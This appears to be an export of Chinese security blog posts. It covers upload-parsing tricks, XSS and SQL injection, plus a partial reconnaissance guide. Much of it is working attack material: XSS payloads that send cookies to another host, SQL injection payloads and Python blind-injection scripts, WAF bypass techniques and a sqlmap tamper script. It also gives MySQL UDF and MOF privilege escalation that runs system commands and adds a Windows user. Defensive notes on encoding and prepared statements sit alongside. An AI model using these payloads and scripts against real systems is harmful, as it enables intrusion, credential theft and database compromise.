    <content type="text"><![CDATA[搭建漏洞服务还是先搭一个漏洞的服务吧：新建一个~/Desktop/php/upload文件夹，文件夹下存在如下结构的文件和文件夹： 123456$ tree.├── files└── upload.php1 directory, 1 file upload.php: 1234567891011121314151617181920212223242526272829303132333435363738394041424344&lt;html&gt;&lt;body&gt;&lt;form action=&quot;upload.php&quot; method=&quot;post&quot;enctype=&quot;multipart/form-data&quot;&gt;&lt;label for=&quot;file&quot;&gt;Filename:&lt;/label&gt;&lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot; /&gt;&lt;br /&gt;&lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Submit&quot; /&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;&lt;?phpif ($_FILES[&quot;file&quot;][&quot;error&quot;] &gt; 0) &#123; echo &quot;Error: &quot; . $_FILES[&quot;file&quot;][&quot;error&quot;] . &quot;&lt;br /&gt;&quot;;&#125;else &#123; // 判断当期目录下的 upload 目录是否存在该文件 // 如果没有 upload 目录，你需要创建它，upload 目录权限为 777 if (file_exists(&quot;files/&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;])) &#123; echo $_FILES[&quot;file&quot;][&quot;name&quot;] . &quot; 文件已经存在。 &quot;; &#125; else &#123; echo &quot;PWD: &quot; . `pwd` . &quot;&lt;br /&gt;&quot;; echo &quot;Upload: &quot; . $_FILES[&quot;file&quot;][&quot;name&quot;] . &quot;&lt;br /&gt;&quot;; echo &quot;Type: &quot; . $_FILES[&quot;file&quot;][&quot;type&quot;] . &quot;&lt;br /&gt;&quot;; echo &quot;Size: &quot; . ($_FILES[&quot;file&quot;][&quot;size&quot;] / 1024) . &quot; Kb&lt;br /&gt;&quot;; // 如果 upload 目录不存在该文件则将文件上传到 upload 目录下 $file_path = &quot;files/&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;]; $success = move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;], $file_path); echo &quot;Stored in: &quot; .$file_path.&quot;&lt;br/&gt;&quot;; if(file_exists($file_path))&#123; $str = file_get_contents($file_path);//将整个文件内容读入到一个字符串中 $str = str_replace(&quot;\r\n&quot;,&quot;&lt;br /&gt;&quot;,$str); $str = htmlspecialchars($str); echo &quot;File Contents: $str&quot;; &#125; &#125;&#125;?&gt; Nginx1.php%001.jpg，Nginx在%00截断，例如： 用%00截断过狗： 防御设置上传目录不被php解析： 12345678910111213141516171819202122server &#123; listen 80; listen [::]:80; server_name test.com; root /home/repersp/Desktop/php; index test.php; location ~ \/upload\/files\/.* &#123; root /home/repersp/Desktop/php; &#125; location ~ \.php$ &#123; include snippets/fastcgi-php.conf; # With php7.0-cgi alone: # fastcgi_pass 127.0.0.1:9000; # With php7.0-fpm: fastcgi_pass unix:/run/php/php7.0-fpm.sock; &#125;&#125; 文件名后缀黑名单： 123if(in_array($ext, ['php', 'php3', 'php4', 'php5', 'phtml', 'pht'])) &#123; exit('bad file');&#125; Apache2.4.0以前1.php.xxxApache从后往前解析，直到能解析。 2.4.0-2.4.291.php%0A因为代码中不能用$_FILES[&quot;file&quot;][&quot;name&quot;]获取文件名，所以利用条件苛刻。 IIS6.0 /xx.asp;.jpg IIS不解析;后面的内容 /1.asp/1.jpg IIS将.asp文件夹下的所有文件解析 7.5php.jpg/.php 要开启cgi.fix_pathinfo=1]]></content>
      <categories>
        <category>Web安全-组件</category>
      </categories>
      <tags>
        <tag>nginx</tag>
        <tag>apache</tag>
        <tag>IIS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[XSS类型、利用和防御]]></title>
    <url>%2Fxss-XSS%E7%B1%BB%E5%9E%8B%E3%80%81%E5%88%A9%E7%94%A8%E5%92%8C%E9%98%B2%E5%BE%A1%2F</url>
    <content type="text"><![CDATA[XSS类型反射型用户访问带有XSS代码的请求，服务器立即将代码发送至浏览器，浏览器执行恶意代码： 123// http://127.0.0.1/reflect.php?xss=&lt;script&gt;alert(1);&lt;/script&gt;setcookie('session', 'qwerty');echo $_GET['xss']; 存储型XSS代码被保存（至数据库），待页面被访问时再执行： 1234567891011121314151617181920212223242526&lt;?php$action=$_GET['action'];$name=$_GET['name'];$password=$_GET['password'];$conn=mysql_connect('127.0.0.1','root','root');mysql_select_db("test",$conn);if($action=='get')&#123; $sql="select * from test where username='$name'"; $result=mysql_query($sql,$conn); if($result)&#123; while ($row = mysql_fetch_assoc($result)) &#123; print_r($row); &#125; &#125; else &#123; echo "Error".mysql_error()."&lt;/br&gt;"; &#125;&#125; else &#123; $sql="insert into test values ('$name', '$password')"; $result=mysql_query($sql,$conn); if($result)&#123; print_r($result); &#125; else &#123; echo "Error".mysql_error()."&lt;/br&gt;"; &#125;&#125;?&gt; 先插入一个存在问题的数据 1http://127.0.0.1/saved.php?action=insert&amp;name=anemone&amp;password=&lt;script&gt;alert(/xss/)&lt;/script&gt; 接着访问： 1http://127.0.0.1/saved.php?action=get&amp;name=anemone DOM型通过js操控dom引入xss代码： 1234567&lt;script&gt;// http://127.0.0.1/dom.php?url=javascript:alert(/xss/)var url_search=document.location.search;var the_url = new URLSearchParams(url_search).get('url');var markup='&lt;a href="'+the_url+'"&gt;Link&lt;/a&gt;';document.write(markup);&lt;/script&gt; 出现场景： 在前端实现页面跳转（location.href=’javascript:alert(1)’） 取值写入页面或动态执行 div.innerHTML=payload eval(payload) 使用HTML5 postMessage进行跨域通讯 利用发送cookie：1http://127.0.0.1/reflect.php?xss=&lt;script&gt;fetch(&apos;http://127.0.0.2:8888/&apos;.concat(window.btoa(document.cookie)))&lt;/script&gt; 使用XSSPT平台：1http://127.0.0.1/reflect.php?xss=%3Cscript%20src=https://xsspt.com/v5Ia54%3E%3C/script%3E 绕过方式 使用input/img/svg等标签和onerror/onload/onfocus等属性绕过关键词: &lt;input autofocus id=a name=&quot;javascript:123&quot; onfocus=&quot;alert(1)&quot;&gt; &lt;img/src/onerror=alert(1)&gt; &lt;svg/onload=alert(1)&gt; &lt;video/src/onerror=alert(1)&gt; &lt;video/src/onloadstart=alert(1)&gt; &lt;details/open/ontoggle=alert(1)&gt; 使用concat绕过黑名单单词： 1'javascri'.concat('pt:aler','t(1)') 使用+绕过空格 二次编码 防御开启Cookie的HttpOnly选项 反射型 （默认选项）添加浏览器保护头部x-xss-protection: 1 渲染至页面时进行htmlencode htmlspecialchars(&#39;&lt;script&gt;&#39;) =&gt; &amp;lt;script&amp;gt; 存储型渲染至页面时进行htmlencode DOM型在js中进行encodeURI过滤，对于标签中的属性（如示例中的href）使用正则过滤。 样例至少过滤如下符号： 12345678escapeHTML(t)&#123; return t.replace(/&amp;/g,"&amp;amp;") .replace(/&lt;/g,"&amp;lt;") .replace(/&gt;/g,"&amp;gt;") .replace(/ /g,"&amp;nbsp;") .replace(/"/g,"&amp;#34;") .replace(/'/g,"&amp;#39;")&#125; 参考链接 驱散前端安全梦魇——DOMXSS典型场景分析与修复指南，https://security.tencent.com/index.php/blog/msg/107]]></content>
      <categories>
        <category>Web安全-XSS</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[SQL注入总结]]></title>
    <url>%2Fsqli-SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[注入类型Union Based最基本的注入类型，以MySQL为例，假设有注入点： 12SELECT * FROM `test` WHERE `username`=&apos;admin&apos; and `password`=&apos;*&apos;; 0x01 判断注入点若原先能够查询到数据： 12admin&apos; and &apos;1&apos;=&apos;1&apos;%23 #有数据admin&apos; and &apos;1&apos;=&apos;2&apos;%23 #无数据 若原先查询不到数据： 12admin&apos; or &apos;1&apos;=&apos;1&apos;%23 #有数据admin&apos; or &apos;1&apos;=&apos;2&apos;%23 #无数据 若为整数型 12347 &amp;&amp; 1=2 %237 &amp;&amp; 1=1 %237 || 1=2 %237 || 1=2 %23 0x02 查询共有多少字段123a&apos; UNION SELECT 1%23 a&apos; UNION SELECT 1,2%23a&apos; UNION SELECT 1,2,3%23 …直到正常显示数据为止，或者： 123a&apos; ORDER BY 1%23a&apos; ORDER BY 2%23a&apos; ORDER BY 3%23 …直到网页报错为止。 0x03 查询库1a&apos; union select SCHEMA_NAME,2,3,4,5 from information_schema.SCHEMATA %23 0x04 查询表123a&apos; union select TABLE_NAME,2,3,4,5 from information_schema.TABLES where TABLE_SCHEMA=&apos;test&apos; limit 0,1 %23 #第一个表a&apos; union select TABLE_NAME,2,3,4,5 from information_schema.TABLES where TABLE_SCHEMA=&apos;test&apos; limit 1,1 %23 #第二个表... 0x05 查询字段123a&apos; union select COLUMN_NAME,2,3,4,5 from information_schema.COLUMNS where TABLE_NAME=&apos;test&apos; limit 0,1 %23 #第一个字段a&apos; union select COLUMN_NAME,2,3,4,5 from information_schema.COLUMNS where TABLE_NAME=&apos;test&apos; limit 0,1 %23 #第二个字段... 0x05 查询记录1a&apos; union select username,2,3,4,5 from test.test %23 关于注释 #可以换成%23 --+ Error Based若有错误回显的情况下可以使用mysql的一些函数，引发错误，mysql报错时会将函数参数的值返回，如： 常用的报错函数有： updatexml()updatexml(1,concat(0x7e,(select @@version),0x7e),1) extractvalue()extractvalue(1,concat(0x7e,version(),0x7e)) floor()(select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a) geometrycollection() 、multipoint() 、polygon()、multipolygon()、linestring()、multilinestring() #5.5以上不适用 geometrycollection((select * from(select * from(select user())a)b)) exp() #5.5以上不适用 exp(~(select * from(select user())a)); Bool/Time Based （Blind Based）Bool Based若原先能够/不能查询到数据，那么若猜测字段正确，那么现在能够/不能查询数据。 若原先能够查询到数据： 12*&apos; and length((database()))&lt;8#*&apos; and ascii(substring((database()),1,1))=100# 猜测字段 若原先不能查询数据： 12*&apos; or length((database()))&lt;8#*&apos; or ascii(substring((database()),1,1))=100# 猜测字段 给出exp模板： 123456789101112131415161718#coding=UTF-8import requestsresult = ''url = 'http://a3edf37f0d9741c6ad151c8bafbcad60fc11a19cf7f747a9.game.ichunqiu.com/index.php?'payload = 'id=0 or if((ascii(substr((&#123;sql&#125;),&#123;list&#125;,1))&lt;&#123;num&#125;),1,0)'for i in xrange(0,50): for j in xrange(32,126): #hh = payload.format(sql='select database()',list=str(i),num=str(j)) #hh = payload.format(sql='select count(*) from information_schema.tables',list=str(i),num=str(j)) #hh = payload.format(sql='select table_name from information_schema.tables limit 81,1',list=str(i),num=str(j)) hh = payload.format(sql='select * from words.f14g',list=str(i),num=str(j)) #print hh zz = requests.get(url+hh) #print zz.content if 'Hello Hacker!!' in zz.content: result += chr(j-1) print result break Time Based那么若猜测字段正确，那么现在延迟一段时间后再返回。 1*&apos; or if(ascii(substring((database()),1,1))=116, sleep(100), 1); 给出exp模板： 123456789101112import requestsflag = ''for i in range(1,33): for j in '0123456789abcdef': url = 'http://101.71.29.5:10004/Admin/User/Index?search[table]=flag where 1 and if((ascii(substr((select flag from flag limit 0,1),'+str(i)+',1))='+str(ord(j))+'),sleep(3),0)--' try: r = requests.get(url=url,timeout=2.5) except: flag += j print flag break 其他用到的函数/关键字 regexp binary and password regexp binary ‘^A’# mid() 同substr MID(version(),1,1) ord() 同ascii 堆叠注入使用;结束上一句查询语句后再执行另一条语句： 1SELECT * FROM test;select if(1=1,SLEEP(100),1); 非where的注入点order by注入点 Error Based order by 1 and(updatexml(1,concat(0x7e,@@version,0x7e),0)) Time Based #5.5复现失败 order by if(1=2,1,(SELECT(1)FROM(SELECT(SLEEP(2)))test)) Bool Based order by (select+1+regexp+if(substring(user(),1,1)=0x72,1,0x00)) limit注入点 limit 1,1 procedure analyse(extractvalue(1,concat(0x7e,version(),0x7e)),1) group by注入点GROUP BY if(1=2,1,(SELECT(1)FROM(SELECT(SLEEP(2)))test)); table注入点users where updatexml(1, concat(0x7e, (select user()), 0x7e), 1)# desc注入点desc不完全可控和table结合，需要保证desc成功，table报错，只有在desc和table只能有一个含”&#96;”时能注入（都含有或都不含有则无解）12345678mysql_connect("localhost","root","xiaoyu");mysql_query("use b2cshop");$table = $_GET['table'];mysql_query("desc `shop_&#123;$table&#125;`") or die("DESC 出错:".mysql_error()); //表名不完全可控$sql = "select * from shop_&#123;$table&#125; where 1=1";echo $sql;var_dump(mysql_fetch_array(mysql_query("$sql")));echo mysql_error(); 123?table=users` `where updatexml(1,concat(0x5e24,(select user()),0x5e24),1)#desc `shop_users` `where updatexml(1,concat(0x5e24,(select user()),0x5e24),1)#` 宽字节注入产生原因即使输入时使用了addslashes进行了过滤，但是MySQL的客户端字符集（character_set_client）设置为GBK、BIG5或其他，导致/在解码时被跳脱，例如有如下程序： 12345678910111213141516171819&lt;!DOCTYPE html&gt;&lt;meta charset="gbk"&gt;&lt;?php$name=$_GET['name'];$name=addslashes($name); //name被转义$conn=mysql_connect('127.0.0.1','root','root');mysql_select_db("test",$conn);$result=mysql_query("SET NAMES 'GBK'");$sql="select * from test where username='".$name."'";$result=mysql_query($sql,$conn);if($result)&#123; while ($row = mysql_fetch_assoc($result)) &#123; print_r($row); &#125;&#125; else &#123; echo "Error".mysql_error()."&lt;/br&gt;";&#125;?&gt; payload为?name=admin%df%27%20union%20select%201,2%20%23 编码过程1&#39; ==addslashes==&gt; 1\&#39; (1\x5c\x27)1%df&#39; ==addslashes==&gt; 1%df\&#39;(1\xdf\x5c\x27) ==encode(gbk)==&gt; 1運&#39; #&#39;逃逸 iconv转换情况gbk编码转换成utf8时，转换时也会引发错误：1234567891011121314151617181920&lt;!DOCTYPE html&gt;&lt;meta charset="gbk"&gt;&lt;?php$conn=mysql_connect('127.0.0.1','root','root');mysql_select_db("test",$conn);$name=$_GET['name'];mysql_query("set names UTF-8") ;$bar =iconv("GBK","UTF-8", addslashes($name));$sql="select * from test where username='".$name."'";$result=mysql_query($sql,$conn);if($result)&#123; while ($row = mysql_fetch_assoc($result)) &#123; print_r($row); &#125;&#125; else &#123; echo "Error".mysql_error()."&lt;/br&gt;";&#125;?&gt; payload为admin%e5%5c%27%20union%20select%201,2%20%23(admin%e5\&#39; union select 1,2 #) 编码过程（由于\xe5\x5c转为UTF-8为\xe9\x8c\xa6）： %e5\&#39; (\xe5\x5c\x27) ==addslashes==&gt; %e5\\\&#39; (\xe5\x5c\x5c\x5c\x27) ==iconv==&gt; \xe9\x8c\xa6\x5c\x5c\x27 另外，若编码为BIG5时，payload为1兝\&#39; =&gt; 1\xa2\x5c\x5c\x27 =&gt; 1?\\&#39;。 解决办法 换用utf8字符集 使用mysql_set_charset()设置字符集并且使用mysql_real_escape_string()转义，其会考虑当前字符集所以不会产生逃逸问题： mysql_set_charset(&#39;gbk&#39;);$name=mysql_real_escape_string($name); 绕过绕过字符 绕过空格 %0a(\r)、%0b(\t)、%a0(+) 绕过单引号 编码：Unicode（IIS支持）、Hex 函数：char 宽字节 数字型 绕过union 使用盲注 绕过and/or &amp;&amp; / || substring() mid() left() right() 绕过小括号 ?username=admin&#39; and password binary regexp &#39;^A&#39; 绕过ngx_lua_waf详细请参考Bypass ngx_lua_waf SQL注入防御（多姿势） HTTP 参数污染（HPP）12http://192.168.8.147/test/sql.aspx?id=1 UNION/&amp;ID=/SELECT null,name,null/&amp;Id=/FROM master.dbo.sysdatabases URI参数溢出提交100个以上参数：123http://192.168.204.128/test.phpPOST：id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp; id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1 union select 1,2,schema_name %0a/*!from*/information_schema.SCHEMATA MSSQL123http://192.168.204.128/test.aspxPOST：id=1/*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*/ union select null,table_name,null from INFOMATION_SCHEMA.tables 绕过360主机卫士详细请参考Bypass 360主机卫士SQL注入防御（多姿势） 利用默认白名单1/test.php/1.png?id=1 union select 1,2,schema_name from information_schema.SCHEMATA 利用静态资源1/test.php/1.png?id=1 union select 1,2,schema_name from information_schema.SCHEMATA 缓冲区溢出1id=1 and (select 1)=(Select 0xAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA) union select 1,2,schema_name from information_schema.SCHEMATA URI参数溢出同ngx_lua_waf GET+POST提交POST请求时，忽略GET请求中的参数 123http://192.168.204.132/sql.aspx?id=1 and 1=2 union select 1,column_name,3 from information_schema.columnsPOST：aaa multipart/form-data12345------WebKitFormBoundaryACZoaLJJzUwc4hYMContent-Disposition: form-data; name=&quot;id&quot;1 union /*!select*/ 1,2,schema_namefrom information_schema.SCHEMATA------WebKitFormBoundaryACZoaLJJzUwc4hYM-- 内联注释直接用fuzz脚本，结合注释、空格绕过和/*!*/进行绕过： 1234567891011121314151617181920212223242526import requestsurl = "http://test.com/index.php?id=1"Fuzz_a = [ '/*!', '*/', '/**/', '/', '?', '~', '!', '.', '%', '-', '*', '+', '=']Fuzz_b = ['']Fuzz_c = ['%0a', '%0b', '%0c', '%0d', '%0e', '%0f', '%0h', '%0i', '%0j']FUZZ = Fuzz_a + Fuzz_b + Fuzz_c# 配置fuzz字典header = &#123; 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0'&#125;sql='union select SCHEMA_NAME,2 from information_schema.SCHEMATA'sql_arr="/*!&#123;&#125;*/#".format(sql).split()# 设置请求的headersfor a in FUZZ: for b in FUZZ: for c in FUZZ: for d in FUZZ: for e in FUZZ: fuzz_here=a + b + c + d + e # RAW: PYLOAD = "/*!union" + fuzz_here + "select 1,2*/#" PYLOAD = fuzz_here.join(sql_arr) # exit(0) urlp = url + PYLOAD res = requests.get(urlp, headers=header) # 使用for排列组合fuzz字典并请求页面, 因为组合后不一定符合sql语句，所以需要用正常页面特征做判断 if 'wait' in res.text: print ("[*]URL:" + urlp + u"过狗！") # 如果返回的页面中包含wait字符，则打印并写出过狗payload。 绕过护卫神详细请参考Bypass 护卫神SQL注入防御（多姿势） %00截断ASPX: 1/sql.aspx?id=1%00and 1=2 union select 1,2,column_name from information_schema.columns PHP: 1/sql.php?id=1/*%00*/union select 1,schema_name,3 from information_schema.schemata Unicode编码适用于IIS服务器1http://192.168.204.132/sql.aspx?id=1 and 1=2 union s%u0045lect 1,2,column_name from information_schema.columns HPPASPX中接受参数顺序为为GET，POST，COOKIE： 123http://192.168.204.132/sql.aspx?id=1 and 1=2 union/*POST：id=*/select 1,column_name,3 from information_schema.columns %号IIS+ASP中解析会去掉%： 1/sql.asp?id=1 and 1=2 un%ion select 1,2,column_name from information_schema.columns 缓冲区溢出同360的缓冲区溢出，(Select 0xA*49099)。 绕过安全狗同360主机卫士的内联注释绕过 分块传输详见HTTP协议复习分块传输部分 SQLMap Tamper写法123456789101112131415from lib.core.enums import PRIORITYfrom lib.core.settings import UNICODE_ENCODING__priority__ = PRIORITY.LOWdef dependencies(): passdef tamper(payload, **kwargs): if payload: payload=payload.replace("UNION ALL SELECT","union%23!@%23$%%5e%26%2a()%60~%0a/*!12345select*/") payload=payload.replace("UNION SELECT","union%23!@%23$%%5e%26%2a()%60~%0a/*!12345select*/") payload=payload.replace(" FROM ","/*!%23!@%23$%%5e%26%2a()%60~%0afrOm*/") payload=payload.replace("CONCAT","/*!12345CONCAT*/") payload=payload.replace("CAST(","/*!12345CAST(*/") payload=payload.replace("CASE","/*!12345CASE*/") payload=payload.replace("DATABASE()","database/**/()") return payload 不同用户的权限MySQL普通用户有information_schema表的读权限，但没有mysql表的读权限 MSSQL很复杂，详细看深秋之夜360面试有感 写文件需要解除secure-file-priv=12select '文件内容' into outfile '文件路径'select '文件内容' into dumpfile '文件路径' 提权用户自定义函数提权（UDF）获取UDF.dll的hex编码1select hex(load_file(%USER%\\Desktop\\udf.dll)) into dumpfile &apos;%USER%\\Desktop\\udf.txt&apos;; 保存udf.dll到目标主机若数据库版本为5.0以下将其保存到C:\Windows\或C:\Windows\System32\，否则保存到@@basedir\lib\plugin\ 使用select &#39;xxx&#39; into dumpfile &#39;C:/MySQL/lib/plugin/::$INDEX_ALLOCATION&#39;;新建文件夹(这里我没成功，网上说确实不成功) 123CREATE TABLE Temp_udf(udf BLOB);INSERT into Temp_udf values (unhex(&apos;$shellcode&apos;)); #$shellcode为hex(udf.dll)SELECT udf FROM Temp_udf INTO DUMPFILE &apos;C:/MySQL/lib/plugin/udf.dll&apos;; 使用用户函数提权123create function cmdshell returns string soname &apos;udf.dll&apos;; #此处不能填绝对路径 只能是dll名select * from mysql.func; #看看cmdshell function是否创立，创立就继续select hex(cmdshell(&apos;whoami&apos;)); #运行各种命令提权 mof提权由于c:/windows/system32/wbem/mof/目录下的 nullevt.mof 文件，每分钟都会在一个特定的时间去执行一次，因此可以使用dumpfile将shell写入，然后由系统执行（有点像linux的crontab） 12345678910111213141516171819202122232425#pragma namespace(&quot;\\\\.\\root\\subscription&quot;) instance of __EventFilter as $EventFilter&#123; EventNamespace = &quot;Root\\Cimv2&quot;; Name = &quot;filtP2&quot;; Query = &quot;Select * From __InstanceModificationEvent &quot; &quot;Where TargetInstance Isa \&quot;Win32_LocalTime\&quot; &quot; &quot;And TargetInstance.Second = 5&quot;; QueryLanguage = &quot;WQL&quot;;&#125;; instance of ActiveScriptEventConsumer as $Consumer&#123; Name = &quot;consPCSV2&quot;; ScriptingEngine = &quot;JScript&quot;; ScriptText =&quot;var WSH = new ActiveXObject(\&quot;WScript.Shell\&quot;)\nWSH.run(\&quot;net.exe user anemone /add\&quot;)&quot;;&#125;; instance of __FilterToConsumerBinding&#123; Consumer = $Consumer; Filter = $EventFilter;&#125;; 上传之后用mysql写文件： 1select load_file(&apos;c:/www/nullevt.mof&apos;) into dumpfile &apos;c:/windows/system32/wbem/mof/nullevt.mof&apos; 防御——使用预编译语句预先编译sql，后面的注入语句只能做普通字符串查询，预编译语句不能用于orderby SQL写法： 预编译 1prepare ins from &apos;insert into t select ?,?&apos;; 执行 123set @a=999,@b=&apos;hello&apos;;execute ins using @a,@b;select * from t; 释放 1deallocate prepare ins; 三次交互： Python写法，python并不支持MySQL的预编译语句（第三方库oursql支持），只是将字符串转义后放到数据库查询： 1cursor.execute('insert into user (name,password) value (%s,%s)',(name,password)) Java写法，需要开启预编译功能（useServerPrepStmts=true），程序与数据库3次交互prepare-&gt;execute-&gt;close stmt 1234567891011try &#123; Class.forName(name);//指定连接类型 conn = DriverManager.getConnection(url, user, password);//获取连接 pst = conn.prepareStatement("SELECT * FROM users WHERE `name`=?");//准备执行语句 pst.setString(1,"9ian1i"); rs = pst.executeQuery(); while (rs.next())&#123; String name = rs.getString("name"); System.out.println(name); &#125;&#125; php写法 1234567891011&lt;?php$name=$_GET['name'];$mysqli = new mysqli('127.0.0.1','root','root','test');$mysqli_stmt=$mysqli-&gt;prepare("select username, password from test where username=?");$mysqli_stmt-&gt;bind_param('s', $name);$mysqli_stmt-&gt;execute();$mysqli_stmt-&gt;bind_result($username, $password);while($mysqli_stmt-&gt;fetch())&#123; echo "$username--$password";&#125;?&gt; 参考链接 十种MySQL报错注入，https://www.cnblogs.com/xishaonian/p/6102750.html 深入探究宽字节注入漏洞与修补原理，https://blog.csdn.net/qq_29419013/article/details/81205291 Bypass ngx_lua_waf SQL注入防御（多姿势），https://www.t00ls.net/articles-45736.html Bypass 360主机卫士SQL注入防御（多姿势），https://www.t00ls.net/articles-45943.html Bypass 护卫神SQL注入防御（多姿势），https://www.t00ls.net/articles-46165.html 深秋之夜360面试有感，https://paper.tuisec.win/detail/9146d3bd2335703]]></content>
      <categories>
        <category>Web安全-SQL注入</category>
      </categories>
      <tags>
        <tag>SQL</tag>
        <tag>注入</tag>
        <tag>waf绕过</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[信息收集思路整理]]></title>
    <url>%2F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E6%80%9D%E8%B7%AF%E6%95%B4%E7%90%86%2F</url>
    <content type="text"><![CDATA[信息收集是渗透测试的第一步，本文总结目前信息收集的具体操作步骤。 网站信息whois信息可以收集到的信息有： 联系人 邮箱（可以到社工库进一步查询） 电话 收集途径有： http://whois.chinaz.com/ （站长之家） https://who.is/ （国外） https://x.threatbook.cn/（通过邮箱查询其他的站点） https://dns.aizhan.com/ （IP反查域名） 命令whois anemone.top 备案信息仍然是收集联系人、公司等信息 途径有： https://www.tianyancha.com/brand/b59c12209 （天眼查） http://www.gsxt.gov.cn（国家信用公示） http://icp.chinaz.com（站长之家，可以查询其他备案站点） DNS信息DNS用来获取网站IP，但若网站使用了CDN服务则无效。 dig anemone.top # Linux dig @1.1.1.1 anemone.top # 使用1.1.1.1dns解析 nslookup anemone.top # Windows 指纹信息获取中间件类型和版本，通过http头部获取，也可以用whatweb工具： 1$ whatweb anemone.top 根据目录、头文件、特有文件等识别CMS： http://www.yunsee.cn/finger.html http://whatweb.bugscaner.com/look/ Test404轻量CMS指纹识别 nmap -p80,443 --script=http-waf-fingerprint ip nmap -p80,443 --script=http-waf-fingerprint ip 服务器的相关信息寻找真实IP先用多地ping判断网站是否存在CDN： http://tool.chinaz.com/dns/ 若存在CDN则尝试如下办法寻找真实IP： 分站域名 DNS历史记录 https://securitytrails.com/ https://x.threatbook.cn/ VirusTotal 上传附件 国外DNS：利用国内网站不在国外做CDN的特点，使用国外的DNS解析，感谢”经验分享｜谈谈渗透测试中的信息搜集“提供了以下冷门的DNS： 1234567891011121314151617181920209.244.0.364.6.64.68.8.8.89.9.9.98.26.56.26199.85.126.10208.67.222.222195.46.39.3969.195.152.204208.76.50.50216.146.35.3537.235.1.174198.101.242.7277.88.8.891.239.100.10074.82.42.42109.69.8.51156.154.70.11.1.1.145.77.165.194 